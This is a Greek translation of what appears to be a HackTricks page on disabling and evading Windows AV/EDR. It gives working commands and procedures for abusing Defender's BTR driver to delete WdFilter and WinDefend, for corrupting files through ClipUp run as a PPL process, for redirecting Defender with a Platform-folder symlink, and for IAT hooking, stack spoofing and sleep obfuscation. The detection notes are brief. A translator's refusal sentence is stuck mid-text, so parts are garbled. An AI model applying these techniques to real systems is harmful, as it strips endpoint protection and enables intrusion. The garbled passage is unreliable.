Κανονικά, ο Defender αποθηκεύει τον πόρο ως αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει δεδομένα ανατροφοδότησης και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε ο driver να αποφορτωθεί αντί να παραμείνει στη μνήμη. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με τερματισμό null και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), μαζί με δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32, πολυώνυμο `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC επαναφέρεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action ID εκθέτουν αυτά τα primitives του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο επιτιθέμενος· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού μητρώου |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής μητρώου |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής μητρώου και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, ο διαχωριστής κλειδιού/τιμής στο wire είναι **δύο διαδοχικές ανάστροφες κάθετοι**· μια διαδρομή με τη συμβατική μορφοποίηση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το `NTSTATUS` που προκύπτει. Για τις ενέργειες 1 και 2, οι οποίες δεν έχουν πεδίο flags στην αρχή, το BTR μετατοπίζει τη διαδρομή στα τέσσερα δεσμευμένα τελικά byte, ώστε να δημιουργήσει χώρο για αυτήν την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας του `BTR_CLI` και παράθυρο πρώιμης εκκίνησης

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός stream feedback, σειριοποίηση/υπολογισμό checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, άμεση δημιουργία του κλειδιού μητρώου της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για το `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για το `-trigger boot`. Η άμεση εγγραφή στο μητρώο παρακάμπτει τη συνηθισμένη διαδρομή SCM `CreateServiceW` και επομένως **δεν** δημιουργεί το Event ID 7045 εγκατάστασης υπηρεσίας. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι χρησιμοποιήσιμο, επειδή το BTR εκτελεί file I/O από το `DriverEntry` πριν να είναι έτοιμα το storage stack και το link `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά security drivers με system-start και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Τα φίλτρα boot-start όπως το `WdFilter` μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα binaries ή τη διαμόρφωση υπηρεσιών τους πριν από την επόμενη εκκίνηση και μπορεί να διαγράψει τα εκτελέσιμα υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν κλείνει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση boot-start και φέρει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προσθέτει στην αρχή την Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log και έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την αποφόρτωση. Αυτό μειώνει τα ίχνη, ενώ η τοποθέτηση feedback στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής ένδειξης

Οι κανόνες που βασίζονται μόνο σε υπογραφές και η λίστα αποκλεισμού ευάλωτων drivers της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συσχετίσεις συμπεριφοράς, διακρίνοντας παράλληλα τη νόμιμη προέλευση Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο staging του BTR. Ένα ADS `.dat` συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender συνήθως τοποθετεί το feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender` με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού BTR driver από προέλευση εκτός Defender με επακόλουθη διαγραφή αρχείου από το `System`/PID 4, ιδιαίτερα όταν πρόκειται για binaries ασφαλείας.
- **Sysmon 11 -> 23:** ειδοποιήστε για τη γρήγορη δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγχετε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αρκεί ως ένδειξη εμπιστοσύνης όταν ένας driver εργαλείου ασφαλείας γίνεται stage από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει ιεραρχία signer/level, ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να αλλοιώνουν η μία την άλλη. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα binary με ενεργοποιημένο PPL και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε καλοήθη λειτουργικότητα (π.χ. logging) σε περιορισμένο write primitive που βασίζεται σε PPL και στοχεύει προστατευμένους καταλόγους τους οποίους χρησιμοποιούν τα AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελεστεί μια διεργασία ως PPL
- Το target EXE (και όλα τα φορτωμένα DLL) πρέπει να είναι υπογεγραμμένα με EKU που υποστηρίζει PPL.
- Η διεργασία πρέπει να δημιουργηθεί με `CreateProcess` χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για signers anti-malware, `PROTECTION_LEVEL_WINDOWS` για signers Windows). Λανθασμένα επίπεδα θα προκαλέσουν αποτυχία κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στην προστασία LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Helper ανοιχτού κώδικα: CreateProcessAsPPL (επιλέγει επίπεδο προστασίας και προωθεί τα ορίσματα στο target EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Δεν μπορώ να μεταφράσω οδηγίες που διευκολύνουν την παράκαμψη antivirus και την καταστροφή των αρχείων του. Μπορώ να βοηθήσω με ασφαλή, αμυντική περίληψη ή με μέτρα εντοπισμού και αποτροπής αυτής της τεχνικής.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις τα περιεχόμενα που γράφει το ClipUp, παρά μόνο τη θέση τους· το primitive ενδείκνυται για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν η γονική διεργασία είναι μη τυπικός launcher, γύρω από την εκκίνηση.
- Νέες υπηρεσίες που έχουν ρυθμιστεί να εκκινούν αυτόματα ύποπτα binaries και ξεκινούν σταθερά πριν από το Defender/AV. Διερεύνησε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries του Defender/τους καταλόγους Platform· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με σημαίες protected-process.
- Τηλεμετρία ETW/EDR: αναζήτησε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιόρισε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και υπό ποιες γονικές διεργασίες· μπλόκαρε την κλήση του ClipUp εκτός νόμιμων περιπτώσεων.
- Υγιεινή υπηρεσιών: περιόρισε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολούθησε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιώσου ότι είναι ενεργοποιημένες η προστασία από αλλοίωση του Defender και οι προστασίες πρώιμης εκκίνησης· διερεύνησε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξέτασε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους όπου φιλοξενούνται εργαλεία ασφαλείας, εφόσον αυτό είναι συμβατό με το περιβάλλον σου (δοκίμασε διεξοδικά).

## Αλλοίωση του Microsoft Defender μέσω παραβίασης συμβολικού συνδέσμου στον φάκελο Platform Version

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και, στη συνέχεια, εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας ανάλογα τις διαδρομές υπηρεσιών/μητρώου). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των σημείων επαναπροσδιορισμού καταλόγου (symlinks). Ένας administrator μπορεί να το αξιοποιήσει για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από attacker και να επιτύχει DLL sideloading ή διακοπή της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender μπλοκάρει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφικά τιμή, χωρίς να επαληθεύει ότι ο προορισμός αντιστοιχεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοίμασε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιούργησε μέσα στο Platform έναν symlink καταλόγου με υψηλότερη έκδοση που να δείχνει στον φάκελό σου:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να δείτε τη νέα διαδρομή διεργασίας κάτω από το `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry να αντανακλούν αυτήν τη θέση.

Post-exploitation options
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, ώστε να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να μην ξεκινά:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της κλιμάκωση προνομίων· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν την αποφυγή ανίχνευσης κατά τον χρόνο εκτέλεσης έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hooking στον Import Address Table (IAT) του και δρομολογώντας επιλεγμένα API μέσω κώδικα ανεξάρτητου από τη θέση (PIC), τον οποίο ελέγχει ο επιτιθέμενος. Αυτό γενικεύει την αποφυγή ανίχνευσης πέρα από το μικρό σύνολο API που εκθέτουν πολλά kits (π.χ. CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και DLL post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα blob PIC δίπλα στο target module χρησιμοποιώντας reflective loader (με prepend ή ως companion). Το PIC πρέπει να είναι αυτόνομο και ανεξάρτητο από τη θέση.
- Καθώς φορτώνεται το host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR του και τροποποιήστε τις εγγραφές IAT για τις στοχευμένες εισαγωγές (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά wrappers PIC.
- Κάθε wrapper PIC εκτελεί τεχνικές αποφυγής ανίχνευσης πριν καλέσει την πραγματική διεύθυνση API μέσω tail-call. Τυπικές τεχνικές περιλαμβάνουν:
  - Απόκρυψη/επαναφορά μνήμης γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και έπειτα επαναφορά μετά την κλήση.
  - Call-stack spoofing: κατασκευάστε μια αβλαβή στοίβα και μεταβείτε στο target API, ώστε η ανάλυση call-stack να εντοπίζει τα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίζει ποια API θα γίνεται hooking για Beacon, BOFs και DLL post-exploitation.

Γιατί IAT hooking εδώ
- Λειτουργεί για κάθε κώδικα που χρησιμοποιεί την hooked εισαγωγή, χωρίς να τροποποιεί τον κώδικα των εργαλείων ή να βασίζεται στο Beacon για τη διαμεσολάβηση συγκεκριμένων API.
- Καλύπτει DLL post-exploitation: το hooking των LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στις φορτώσεις modules (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε την ίδια απόκρυψη/αποφυγή μέσω stack στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση εντολών post-exploitation που δημιουργούν διεργασίες, απέναντι σε ανιχνεύσεις βασισμένες στο call-stack, μέσω wrapper για τα CreateProcessA/W.

Ελάχιστο παράδειγμα IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και ασφαλή για PIC· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που καταγράψατε πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για το PIC και αποφύγετε σελίδες με δικαιώματα εγγραφής και εκτέλεσης ταυτόχρονα.

Stub πλαστογράφησης call stack
- Τα PIC stubs τύπου Draugr κατασκευάζουν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και μετά μεταπηδούν στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγετε μέσα στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Προσθέστε τον reflective loader πριν από τα post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για την καταχώριση των APIs-στόχων, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion, χωρίς αλλαγές στον κώδικα.

Ζητήματα detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε μη image PIC· ασυνεπής προέλευση RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές στην IAT εντός της διεργασίας, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, απρόσμενες RX περιοχές που δημιουργούνται κατά τη φόρτωση.
- Evasion φόρτωσης image: αν χρησιμοποιείτε hooking στα LoadLibrary*, παρακολουθήστε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα masking μνήμης.

Σχετικά δομικά στοιχεία και παραδείγματα
- Reflective loaders που πραγματοποιούν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Hooks masking μνήμης (π.χ. simplehook) και PIC stack cutting (stackcutting)
- PIC stubs πλαστογράφησης call stack (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks μέσω ενός resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hooking στα imports **κατά τη διάρκεια** του `ProcessImports()`, αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού το transient loader PIC αποδεσμεύσει τη μνήμη του.
- Εξαγάγετε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε μια αναζήτηση hooks βάσει hash, όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε το πραγματικό `GetProcAddress`.
- Καταχωρίστε τους στόχους των hooks κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **import-time IAT redirection** χωρίς patching στο code section του φορτωμένου DLL μετά τη φόρτωση.

### Επιβολή hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), επιβάλετε ένα πραγματικό import, ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικαταστήστε την επίλυση hashed exports (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά όπως η `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την interception κατά την επίλυση των imports από τον reflective loader.

### Ekko-style obfuscation αδράνειας/αναμονής χωρίς patching του `Sleep()`

Αντί να κάνετε patch το `Sleep`, κάντε hooking στις **πραγματικές wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τυλίξτε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε το `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): ορισμός του image σε `PAGE_READWRITE` → κρυπτογράφηση RC4 μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεση της blocking wait → αποκρυπτογράφηση RC4 → **επαναφορά των δικαιωμάτων ανά section** με περιήγηση στα PE sections → σήμανση ολοκλήρωσης.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποιήστε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για την εκτέλεση κάθε βήματος.

Επιχειρησιακή λεπτομέρεια: επιστρέψτε “success” για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image είναι masked. Αυτό το μοτίβο αποκρύπτει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει την κλασική υπογραφή του “patched `Sleep()`”.

Ιδέες για detection (με βάση την τηλεμετρία)
- Ριπές callbacks του `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Runtime CFG registration για gadgets sleep-obfuscation

Σε στόχους με ενεργοποιημένο CFG, το πρώτο έμμεσο jump σε gadget στη μέση μιας συνάρτησης, όπως το `jmp [rbx]` ή το `jmp rdi`, συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να διατηρήσετε ενεργές τις αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε έμμεσο προορισμό που χρησιμοποιεί η αλυσίδα μέσω του `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από τη **βάση του image** και να καλύπτει **ολόκληρο το μέγεθος του image**.
- Για manually mapped/PIC/stomped περιοχές, χρησιμοποιήστε αντί γι' αυτό τη **βάση της allocation** και το μέγεθος της allocation.
- Σημειώστε όχι μόνο το dispatch gadget, αλλά και τα exports στα οποία γίνεται έμμεση μετάβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και τυχόν εκτελέσιμα sections που ελέγχει ο επιτιθέμενος και θα αποτελέσουν έμμεσους στόχους.

Έτσι, οι αλυσίδες ύπνου τύπου ROP/JOP από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» γίνονται επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads σε αναμονή

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να προκαλέσει προβλήματα σε συστήματα CET Shadow Stack, επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread στην ίδια διεργασία και διαβάστε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιουργήστε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που βρίσκεται σε αναμονή με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα το spoofed `Rsp` και την κατάσταση του stack.
- Κατά τη διάρκεια της αναμονής, αντιγράψτε το `NT_TIB` του spoof thread στο TEB του τρέχοντος thread, ώστε οι stack walkers να κάνουν unwind μέσα σε νόμιμο εύρος stack.
- Αφού ολοκληρωθεί η αναμονή, επαναφέρετε το αρχικό TIB και το thread context.

Αυτό διατηρεί έναν instruction pointer συμβατό με CET, ενώ παραπλανά τους EDR stack walkers που βασίζονται στα metadata stack του TEB για να επικυρώνουν τα unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue έχει υπερβολικά αναγνωρίσιμη υπογραφή, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
